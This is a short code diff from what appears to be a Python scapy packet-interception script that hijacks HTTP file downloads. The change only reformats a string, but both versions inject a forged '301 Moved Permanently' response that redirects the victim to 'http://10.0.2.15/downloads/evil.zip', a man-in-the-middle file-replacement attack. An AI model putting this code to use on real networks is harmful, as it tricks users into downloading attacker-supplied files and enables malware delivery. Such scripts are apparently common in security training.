@@ -29,7 +29,8 @@ def process_packet(packet):
                 ack_list.remove(scapy_packet[scapy.TCP].seq)  # Could be converted to walrus assignment in 3.8.
                 print("[+] Replacing file")
                 modified_packet = set_load(scapy_packet,
-                                           "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/downloads/evil.zip\n\n")
+                                           "HTTP/1.1 301 Moved Permanently\n"
+                                           "Location: http://10.0.2.15/downloads/evil.zip\n\n")
                 packet.set_payload(str(modified_packet))
 
     packet.accept()
